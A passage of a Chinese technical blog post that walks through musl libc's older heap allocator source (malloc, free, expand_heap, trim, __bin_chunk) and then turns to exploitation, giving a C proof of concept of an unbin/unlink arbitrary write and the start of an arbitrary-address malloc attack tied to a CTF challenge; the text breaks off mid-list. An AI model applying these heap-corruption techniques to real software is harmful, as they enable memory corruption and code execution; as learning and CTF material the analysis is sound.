<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_fwd</span><span class="params">(<span class="keyword">struct</span> chunk *c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">size_t</span> k;</span><br><span class="line">    <span class="keyword">while</span> (!((k = c-&gt;csize) &amp; C_INUSE)) &#123;</span><br><span class="line">        i = bin_index(k);</span><br><span class="line">        lock_bin(i);</span><br><span class="line">        <span class="keyword">if</span> (c-&gt;csize == k) &#123;</span><br><span class="line">            unbin(c, i);</span><br><span class="line">            unlock_bin(i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unlock_bin(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_rev</span><span class="params">(<span class="keyword">struct</span> chunk *c)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">size_t</span> k;</span><br><span class="line">    <span class="keyword">while</span> (!((k = c-&gt;psize) &amp; C_INUSE)) &#123;</span><br><span class="line">        i = bin_index(k);</span><br><span class="line">        lock_bin(i);</span><br><span class="line">        <span class="keyword">if</span> (c-&gt;psize == k) &#123;</span><br><span class="line">            unbin(PREV_CHUNK(c), i);</span><br><span class="line">            unlock_bin(i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        unlock_bin(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>alloc_fwd</code> 通过当前 <code>chunk</code> 的
<code>csize</code> 检查当前 <code>chunk</code> 是否空闲，如果空闲调用
<code>unbin</code> 函数将当前 <code>chunk</code> 从 <code>bins</code>
链表中取出。 <code>alloc_rev</code> 通过当前 <code>chunk</code> 的
<code>psize</code> 检查当前 <code>chunk</code> 的前一个
<code>chunk</code> 是否空闲，如果空闲调用 <code>unbin</code> 函数将当前
<code>chunk</code> 的前一个 <code>chunk</code> 从 <code>bins</code>
链表中取出。 ## 函数分析 ### malloc 首先调用 <code>adjust_size</code>
检查申请内存大小是否合理并将申请的内存大小转换为 <code>chunk</code>
大小，具体转换规则为加 0x10 然后关于 0x20 向上对齐。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">adjust_size</span><span class="params">(<span class="type">size_t</span> *n)</span> &#123;</span><br><span class="line">    <span class="comment">/* Result of pointer difference must fit in ptrdiff_t. */</span></span><br><span class="line">    <span class="keyword">if</span> (*n - <span class="number">1</span> &gt; PTRDIFF_MAX - SIZE_ALIGN - PAGE_SIZE) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*n) &#123;</span><br><span class="line">            errno = ENOMEM;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            *n = SIZE_ALIGN;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *n = (*n + OVERHEAD + SIZE_ALIGN - <span class="number">1</span>) &amp; SIZE_MASK;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (adjust_size(&amp;n) &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div> 如果
<code>chunk</code> 大小超过 <code>MMAP_THRESHOLD</code>（即 0x38000
）则直接 mmap 分配 <code>chunk</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &gt; MMAP_THRESHOLD) &#123;</span><br><span class="line">    <span class="type">size_t</span> len = n + OVERHEAD + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">    <span class="type">char</span> *base = __mmap(<span class="number">0</span>, len, PROT_READ | PROT_WRITE,</span><br><span class="line">                        MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (base == (<span class="type">void</span> *) <span class="number">-1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    c = (<span class="type">void</span> *) (base + SIZE_ALIGN - OVERHEAD);</span><br><span class="line">    c-&gt;csize = len - (SIZE_ALIGN - OVERHEAD);</span><br><span class="line">    c-&gt;psize = SIZE_ALIGN - OVERHEAD;</span><br><span class="line">    <span class="keyword">return</span> CHUNK_TO_MEM(c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> mmap 得到的
<code>chunk</code> 结构如下，注意该 <code>chunk</code> 的
<code>psize</code> 和 <code>csize</code> 的 <code>C_INUSE</code>
标志位均没有置位且没有下一个 <code>chunk</code> 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f134734a87c51eecae27ecd8677ae569.png"
                     
alt="在这里插入图片描述" 
                > 如果大小不超过 <code>MMAP_THRESHOLD</code>
则先通过 <code>bin_index_up</code> 函数计算 <code>chunk</code>
大小对应的 <code>bin</code> 数组下标 <code>i</code> 。然后通过
<code>mal.binmap</code> 获取下标大于等于 <code>i</code> 的非空
<code>bin</code> 。接下来是两种情况，如果没有则调用
<code>expand_heap</code> 函数扩展堆然后调用 <code>alloc_rev</code>
将新扩展的堆块和前面空闲的堆块合并然后跳出循环，否则调用
<code>first_set</code> 函数获取大于等于 <code>i</code>
的最小下标，然后利用 <code>pretrim</code> 或 <code>unbin</code> 将
<code>chunk</code> 从 <code>bin</code>
链表中取出，最终也会跳出循环。这两种情况最终都会调用 <code>trim</code>
函数，这个函数的作用是从 <code>c</code> 上切下一块 <code>chunk</code>
用于内存分配，剩下的释放掉。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3b02b82fc7fffa0ecbd53acd0c921c92.png"
                     
alt="在这里插入图片描述" 
                > ### expand_heap 首先将需要扩展的大小
<code>n</code> 加上 <code>SIZE_ALIGN</code>（0x20），之后调用
<code>__expand_heap</code> 扩展堆并返回扩展后的内存的起始地址。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The argument n already accounts for the caller&#x27;s chunk</span></span><br><span class="line"><span class="comment"> * overhead needs, but if the heap can&#x27;t be extended in-place,</span></span><br><span class="line"><span class="comment"> * we need room for an extra zero-sized sentinel chunk. */</span></span><br><span class="line">n += SIZE_ALIGN;</span><br><span class="line"></span><br><span class="line">lock(heap_lock);</span><br><span class="line"></span><br><span class="line">p = __expand_heap(&amp;n);</span><br><span class="line"><span class="keyword">if</span> (!p) &#123;</span><br><span class="line">    unlock(heap_lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
如果新扩展的内存的起始地址不等于上一段扩展的内存的结束地址说明内存扩展不连续或者是第一次获取内存，需要在新扩展的
<code>chunk</code> 前面设置一个 <code>sentinel chunk</code> 。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* If not just expanding existing space, we need to make a</span></span><br><span class="line"><span class="comment"> * new sentinel chunk below the allocated space. */</span></span><br><span class="line"><span class="keyword">if</span> (p != end) &#123;</span><br><span class="line">    <span class="comment">/* Valid/safe because of the prologue increment. */</span></span><br><span class="line">    n -= SIZE_ALIGN;</span><br><span class="line">    p = (<span class="type">char</span> *) p + SIZE_ALIGN;</span><br><span class="line">    w = MEM_TO_CHUNK(p);</span><br><span class="line">    w-&gt;psize = <span class="number">0</span> | C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 之后设置新扩展的 <code>chunk</code> 和下一个
<code>chunk</code> 的头部信息。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Record new heap end and fill in footer. */</span></span><br><span class="line">end = (<span class="type">char</span> *) p + n;</span><br><span class="line">w = MEM_TO_CHUNK(end);</span><br><span class="line">w-&gt;psize = n | C_INUSE;</span><br><span class="line">w-&gt;csize = <span class="number">0</span> | C_INUSE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fill in header, which may be new or may be replacing a</span></span><br><span class="line"><span class="comment"> * zero-size sentinel header at the old end-of-heap. */</span></span><br><span class="line">w = MEM_TO_CHUNK(p);</span><br><span class="line">w-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">unlock(heap_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> w;</span><br></pre></td></tr></table></figure></div> 这里假设连续调用两次
<code>expand_heap</code>，则内存分布如下。由此可知道前面
<code>n += SIZE_ALIGN;</code>
是为了确保如果是不连续或第一次扩展堆时有可以有空间提供
<code>sentinel chunk</code> 和下一个 <code>chunk</code> 的头部。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/566d09f0c1b0a63232b6fa94494a346c.png"
                     
alt="在这里插入图片描述" 
                ></p>
<h3 id="expand_heap">__expand_heap</h3>
<p>首先检验扩展的大小 <code>n</code> 是否合理，之后将 <code>n</code>
关于页大小向上对齐。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &gt; SIZE_MAX / <span class="number">2</span> - PAGE_SIZE) &#123;</span><br><span class="line">    errno = ENOMEM;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">n += -n &amp; PAGE_SIZE - <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div> 如果 heap 段还没有初始化过则通过
<code>brk(0)</code> 系统调用获取 heap 段基址，并将 <code>brk</code>
关于页面大小向上对齐。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!brk) &#123;</span><br><span class="line">    brk = __syscall(SYS_brk, <span class="number">0</span>);</span><br><span class="line">    brk += -brk &amp; PAGE_SIZE - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 如果满足 <code>brk</code>
调用条件且 <code>brk</code> 调用正常则直接返回得到的内存。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &lt; SIZE_MAX - brk &amp;&amp; !traverses_stack_p(brk, brk + n)</span><br><span class="line">    &amp;&amp; __syscall(SYS_brk, brk + n) == brk + n) &#123;</span><br><span class="line">    *pn = n;</span><br><span class="line">    brk += n;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">void</span> *) (brk - n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 否则调用 mmap 扩展内存，扩展内存的大小为
<code>max(n, PAGE_SIZE &lt;&lt; mmap_step / 2)</code> 同时将
<code>mmap_step</code> 加 1 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> min = (<span class="type">size_t</span>) PAGE_SIZE &lt;&lt; mmap_step / <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (n &lt; min) n = min;</span><br><span class="line"><span class="type">void</span> *area = __mmap(<span class="number">0</span>, n, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (area == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">*pn = n;</span><br><span class="line">mmap_step++;</span><br><span class="line"><span class="keyword">return</span> area;</span><br></pre></td></tr></table></figure></div> ### pretrim
<code>pretrim</code> 函数的作用是如果申请的 <code>chunk</code>
中切下所需的部分剩余部分可以放到该 <code>chunk</code> 所在
<code>bins</code> 中则直接从该 <code>chunk</code>
中切下所需部分返回。如果满足上述条件，这样做可以减少一次
<code>unbin</code> 和 <code>pretrim</code> 从而提高程序效率。</p>
<p>首先这里特判了一些不需要 <code>pretrim</code> 的情况。总的来说就是
<code>chunk</code> 或切完剩下的 <code>chunk</code> 太小的时候不需要
<code>pretrim</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (j &lt; <span class="number">40</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (j &lt; i + <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (j != <span class="number">63</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    n1 = CHUNK_SIZE(self);</span><br><span class="line">    <span class="keyword">if</span> (n1 - n &lt;= MMAP_THRESHOLD) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    n1 = CHUNK_SIZE(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 之后判断如果满足
<code>pretrim</code> 的条件就将 <code>self</code> 分裂为
<code>self</code> 和 <code>split</code>，<code>spit</code> 放到
<code>bins</code> 中原来 <code>self</code> 所在位置，然后把新的
<code>self</code> 返回。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (bin_index(n1 - n) != j) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">next = NEXT_CHUNK(self);</span><br><span class="line">split = (<span class="type">void</span> *) ((<span class="type">char</span> *) self + n);</span><br><span class="line"></span><br><span class="line">split-&gt;prev = self-&gt;prev;</span><br><span class="line">split-&gt;next = self-&gt;next;</span><br><span class="line">split-&gt;prev-&gt;next = split;</span><br><span class="line">split-&gt;next-&gt;prev = split;</span><br><span class="line">split-&gt;psize = n | C_INUSE;</span><br><span class="line">split-&gt;csize = n1 - n;</span><br><span class="line">next-&gt;psize = n1 - n;</span><br><span class="line">self-&gt;csize = n | C_INUSE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure></div> ### trim 如果从申请的
<code>chunk</code> 切下所需 <code>chunk</code> 后剩余部分还能构成一个
<code>chunk</code> 就切下所需 <code>chunk</code> 并发剩余部分调用
<code>__bin_chunk</code> 函数释放。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">trim</span><span class="params">(<span class="keyword">struct</span> chunk *self, <span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> n1 = CHUNK_SIZE(self);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">split</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &gt;= n1 - DONTCARE) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    next = NEXT_CHUNK(self);</span><br><span class="line">    split = (<span class="type">void</span> *) ((<span class="type">char</span> *) self + n);</span><br><span class="line"></span><br><span class="line">    split-&gt;psize = n | C_INUSE;</span><br><span class="line">    split-&gt;csize = n1 - n | C_INUSE;</span><br><span class="line">    next-&gt;psize = n1 - n | C_INUSE;</span><br><span class="line">    self-&gt;csize = n | C_INUSE;</span><br><span class="line"></span><br><span class="line">    __bin_chunk(split);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ### free
首先特判传入指针为空的情况。之后判断如果 <code>csize</code> 的
<code>C_INUSE</code> 位为空则通过 <code>psize</code> 找到 mmap
的起始地址 <code>base</code> 和 mmap 的内存长度 <code>len</code>
。之后如果 <code>extra &amp; 1</code> 则终止程序，如果直接 double free
一块非 mmap 的内存就是这个结果。之后调用 <code>__munmap</code>
释放这块内存。如果不是 mmap 得到的 <code>chunk</code> 则调用
<code>__bin_chunk</code> 释放 <code>chunk</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unmap_chunk</span><span class="params">(<span class="keyword">struct</span> chunk *self)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> extra = self-&gt;psize;</span><br><span class="line">    <span class="type">char</span> *base = (<span class="type">char</span> *) self - extra;</span><br><span class="line">    <span class="type">size_t</span> len = CHUNK_SIZE(self) + extra;</span><br><span class="line">    <span class="comment">/* Crash on double free */</span></span><br><span class="line">    <span class="keyword">if</span> (extra &amp; <span class="number">1</span>) a_crash();</span><br><span class="line">    __munmap(base, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free</span><span class="params">(<span class="type">void</span> *p)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">        unmap_chunk(self);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        __bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ###
__bin_chunk 获取 <code>chunk</code> 的大小并初始化
<code>final_size</code> 和 <code>new_size</code> 。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">final_size = new_size = CHUNK_SIZE(self); </span><br></pre></td></tr></table></figure></div> 检测
<code>next-&gt;psize</code> 和 <code>self-&gt;csize</code> 是否相等。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span> =</span> NEXT_CHUNK(self);</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* Crash on corrupted footer (likely from buffer overflow) */</span></span><br><span class="line"><span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br></pre></td></tr></table></figure></div> 将该 <code>chunk</code> 与前后的空闲 <code>chunk</code>
合并直至满足
<code>self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE</code>
条件，即该 <code>chunk</code> 前后都没有空闲 <code>chunk</code> 。
期间如果满足
<code>new_size + size &gt; RECLAIM &amp;&amp; (new_size + size ^ size) &gt; size</code>
（其中 <code>RECLAIM</code> 为 0x28000）则 <code>reclaim</code> 置 1
，之后会对释放的 <code>chunk</code> 包含的所有完整物理页调用
<code>madvise</code> 设置 <code>lazyfree</code>
标志，这样在内存紧缺的时候会回收这些物理页。 <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;</span><br><span class="line">        self-&gt;csize = final_size | C_INUSE;</span><br><span class="line">        next-&gt;psize = final_size | C_INUSE;</span><br><span class="line">        i = bin_index(final_size);</span><br><span class="line">        lock_bin(i);</span><br><span class="line">        lock(mal.free_lock);</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        unlock(mal.free_lock);</span><br><span class="line">        unlock_bin(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (alloc_rev(self)) &#123;</span><br><span class="line">        self = PREV_CHUNK(self);</span><br><span class="line">        size = CHUNK_SIZE(self);</span><br><span class="line">        final_size += size;</span><br><span class="line">        <span class="keyword">if</span> (new_size + size &gt; RECLAIM &amp;&amp; (new_size + size ^ size) &gt; size)</span><br><span class="line">            reclaim = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (alloc_fwd(next)) &#123;</span><br><span class="line">        size = CHUNK_SIZE(next);</span><br><span class="line">        final_size += size;</span><br><span class="line">        <span class="keyword">if</span> (new_size + size &gt; RECLAIM &amp;&amp; (new_size + size ^ size) &gt; size)</span><br><span class="line">            reclaim = <span class="number">1</span>;</span><br><span class="line">        next = NEXT_CHUNK(next);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 之后更新
<code>binmap</code> 以及 <code>chunk</code> 头部各个字段，然后将
<code>chunk</code> 从对应 <code>bins</code> 的 <code>tail</code>
加入到链表中。最后对于 <code>reclaim</code> 为 1 的情况做相应的处理。
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (!(mal.binmap &amp; <span class="number">1ULL</span> &lt;&lt; i))</span><br><span class="line">        a_or_64(&amp;mal.binmap, <span class="number">1ULL</span> &lt;&lt; i);</span><br><span class="line"></span><br><span class="line">    self-&gt;csize = final_size;</span><br><span class="line">    next-&gt;psize = final_size;</span><br><span class="line">    unlock(mal.free_lock);</span><br><span class="line"></span><br><span class="line">    self-&gt;next = BIN_TO_CHUNK(i);</span><br><span class="line">    self-&gt;prev = mal.bins[i].tail;</span><br><span class="line">    self-&gt;next-&gt;prev = self;</span><br><span class="line">    self-&gt;prev-&gt;next = self;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Replace middle of large chunks with fresh zero pages */</span></span><br><span class="line">    <span class="keyword">if</span> (reclaim) &#123;</span><br><span class="line">        <span class="type">uintptr_t</span> a = (<span class="type">uintptr_t</span>) self + SIZE_ALIGN + PAGE_SIZE - <span class="number">1</span> &amp; -PAGE_SIZE;</span><br><span class="line">        <span class="type">uintptr_t</span> b = (<span class="type">uintptr_t</span>) next - SIZE_ALIGN &amp; -PAGE_SIZE;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 1</span></span><br><span class="line">        __madvise((<span class="type">void</span> *) a, b - a, MADV_DONTNEED);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        __mmap((<span class="type">void</span> *)a, b-a, PROT_READ|PROT_WRITE,</span><br><span class="line">            MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unlock_bin(i);</span><br></pre></td></tr></table></figure></div> ## 堆利用 ### unlink musl 采用 <code>unbin</code> 函数从
<code>bins</code> 中取出 <code>chunk</code> ，对应 glibc 中的
<code>unlink</code> ，但是 <code>unbin</code>
中检查不足没有检查链表完整性，可以进行利用实现任意地址写。如果泄露了堆地址还可以写
rop 链进行 ROP 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">unbin</span><span class="params">(<span class="keyword">struct</span> chunk *c, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">        a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span> &lt;&lt; i));</span><br><span class="line">    c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">    c-&gt;next-&gt;prev = c-&gt;prev;</span><br><span class="line">    c-&gt;csize |= C_INUSE;</span><br><span class="line">    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a8db69d1ca1fe564c331a93f283ffa4b.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<p><strong>unlink
的作用是可以在两位置写入可读写地址，很多攻击手法都是建立在 unlink
的基础上的。</strong> <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_unlink_old" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> OVERHEAD (2*sizeof(size_t))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_TO_CHUNK(p) (struct chunk *)((char *)(p) - OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNK_TO_MEM(c) (void *)((char *)(c) + OVERHEAD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> C_INUSE  ((size_t)1)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> psize, csize;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> <span class="title">target</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">fake_chunk</span> =</span> <span class="built_in">malloc</span>(<span class="number">0x30</span>) + <span class="number">0x10</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next_chunk</span> =</span> MEM_TO_CHUNK(<span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">    fake_chunk-&gt;psize |= C_INUSE;</span><br><span class="line">    fake_chunk-&gt;prev = &amp;target;</span><br><span class="line">    fake_chunk-&gt;next = &amp;target;</span><br><span class="line">    next_chunk-&gt;psize = <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">free</span>(CHUNK_TO_MEM(next_chunk));</span><br><span class="line">    assert(target.prev == target.next &amp;&amp; target.prev == &amp;target);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个 poc 是通过 <code>chunk</code> 合并来触发的 unlink
，因此需要满足以下条件： - 为了 <code>free</code> 函数能够调用
<code>__bin_chunk</code> 需要 <code>next_chunk</code> 的
<code>csize</code> 的 <code>C_INUSE</code> 位置 1 。 - 为了绕过
<code>if (next-&gt;psize != self-&gt;csize) a_crash();</code>
检测需要伪造 <code>next_chunk</code> 的 <code>csize</code> 和
<code>next_chunk</code> 的下一个 <code>chunk</code> 的
<code>psize</code>。 - 为了使 <code>alloc_rev</code> 调用
<code>unbin</code> 函数将 <code>fake_chunk</code> 解链，满足
<code>next_chunk-&gt;psize</code> 的 <code>C_INUSE</code> 位不置位。 ###
任意地址 malloc</p>
<p>以这道<a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/2021_NSSC_final_Musl" >题目 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>为例。</p>
<p>musl heap 在 <code>malloc</code> 时没有检查，因此只要修改释放的
<code>chunk</code> 的 <code>next</code> 指针就可以实现任意地址
<code>malloc</code> 。但是有 3 个地方需要注意。</p>
<ul>
<li><p>在 <code>unbin</code> 中判断 <code>bin</code> 为空的条件是</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (c-&gt;prev == c-&gt;next)</span><br><span class="line">    a_and_64(&amp;mal.binmap, ~(<span class="number">1ULL</span> &lt;&lt; i));</span><br></pre></td></tr></table></figure></div>
<p>为了确保下一次能申请出 <code>chunk</code> 来，需要确保本次申请的
<code>chunk</code> 的 <code>prev</code> 和 <code>next</code>
不同。</p></li>
<li><p>由于 <code>unbin</code> 中的解链操作，需要 <code>bins</code>
头指向的 <code>chunk</code> 的 <code>prev</code> 和 <code>next</code>
可写。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br></pre></td></tr></table></figure></div></li>
<li><p>由于 <code>unbin</code> 在完成解链后会修改下一个
<code>chunk</code> 的 <code>psize</code> 的 <code>C_INUSE</code>
位，因此需要 <code>NEXT_CHUNK(c)-&gt;psize</code>
可写，通常需要在目标地址往前找一个偏移使得 <code>fake chunk</code> 的
<code>csize</code> 为一个较小的数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">NEXT_CHUNK(c)-&gt;psize |= C_INUSE;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>因此有如下攻击流程：</p>
<ul>
<li><p>首先利用一次 unlink 将 <code>fake chunk</code> 的
